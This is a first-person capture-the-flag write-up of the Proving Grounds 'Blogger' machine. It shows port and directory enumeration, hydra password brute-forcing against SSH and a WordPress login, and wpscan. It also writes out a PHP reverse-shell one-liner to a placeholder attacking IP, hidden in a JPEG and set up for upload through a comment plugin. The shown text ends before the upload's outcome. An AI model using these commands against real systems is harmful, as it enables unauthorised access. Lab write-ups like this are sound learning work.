# Blogger [Proving Grounds Play]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **Assisted by [write-up link]** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

First step would be defining the target machine's IP inside a variable named `targ3t`:

```
targ3t=192.168.194.217
```

And checking that it works:

```
echo $targ3t
```

Now let's run an `nmap` scan on this target and see where we land:

```
nmap -A $targ3t -oN nmap.a.scan -vv
```

So we basically have an Apache web server at port `80` and an SSH at port `22`. First, I'll explore the website and navigate to:

```
firefox http://$targ3t
```

First look tells us it's a landing page for some programmer named James, it has seemingly non-functional login, registration and contact forms along with some information about the programmer in question. I am going to push this website through `gobuster` and see what comes out:

```
gobuster dir -u $targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A number of links has been returned, specifically with a status code `301` there's first four: `/images/`, `/assets`, `/css`, `/js`. So far all of them seem to be files for the website's content. 

While we're waiting for `gobuster`, I believe we can check exploit database for the Apache web server version this website is running on:

```
searchsploit Apache 2.4.18
```

One of the exploits that popped up, matches the version number. It is a privilege escalation exploit, however:

```
cp /usr/share/exploitdb/exploits/linux/local/46676.php exploit.php
head -20 exploit.php
```

This exploit works by uploading it to the server and then navigating to it as a web resource. We haven't gained any foothold yet, so privilege escalation can wait. Once we're in, we can try it.

Now that `gobuster` scan is done with no usable results, I will push this site through `feroxbuster` to hopefully check for something more:

```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

An interesting URL `http://192.168.194.217/assets/fonts/blog/` came up. There are some blog posts on it on web security by a user named `j@m3s`. This makes me wonder if we can hack into this user's SSH under this username and a `rockyou.txt` wordlist:

```
hydra -t 4 -l j@m3s -P /usr/share/wordlists/rockyou.txt $targ3t ssh
```
```
[ERROR] target ssh://192.168.194.217:22/ does not support password authentication (method reply 4).
```

Let's think, where else could this username be used. There is a login form on the website's home page, let's see its POST request:

```
scheme:     http
host:       192.168.194.217
filename:   /
```

I don't think any of this is usable, the login form is indeed non-functional, I think. Now that I look at the blog web page again, I see there is a link to a `Log in` page on the bottom of the site. However it routes to `blogger.pg/assets/fonts/blog/wp-login.php`, which we can't reach. If we insert `$targ3t` instead of the domain `blogger.pg`, we will be able to open this page:

```
firefox $targ3t/assets/fonts/blog/wp-login.php
```

When I try to test the login form with test credentials, it seems to revert back to `blogger.pg` domain. I think we can resolve this temporarily with ease:

```
sudo echo -e "$targ3t\tblogger.pg" >> /etc/hosts
```

Now it all works! Let's try to login with test credentials and obtain a raw POST request payload:

```
log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblogger.pg%2Fassets%2Ffonts%2Fblog%2Fwp-admin%2F&testcookie=1
```

Now that we have this, we can craft a brute force command for `hydra` to try and check a possible password for user `j@m3s`.

```
hydra -t 12 -l j@m3s -P /usr/share/wordlists/rockyou.txt $targ3t http-post-form "/assets/fonts/blog/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A2F%2blogger.pg%2Fassets%2Ffonts%2Fblog%2Fwp-admin%2F&testcookie=1:F=ERROR" -V
```

This doesn't seem to be working as there is no password that matches this username from the `rockyou.txt` list. 

_<sub>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sub>_

Let's try to use a `wpscan` as this is a wordpress website to see if there are any interesting plugins we could use:

```
wpscan --url http://$targ3t/assets/fonts/blog -t 12 --plugins-detection aggressive -v -o wp.scan
```

In the identified plugins we can see `wpdiscuz`, which has a capability to upload comments and images. I'm wondering if I can upload a php reverse shell as an image and send a request to it:

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'"); __halt_compiler(); ?>
```

I used the above code as a PHP reverse shell and I will try to inject it into a `boat.jpg` I have downloaded the following way:

```
jhead -ce boat.jpg
```

Now I will navigate to one of the blog posts on the blog:

```
firefox https://blogger.pg/assets/fonts/blog/?p=29
```

And try to attach this `boat.jpg` to a comment and post it.
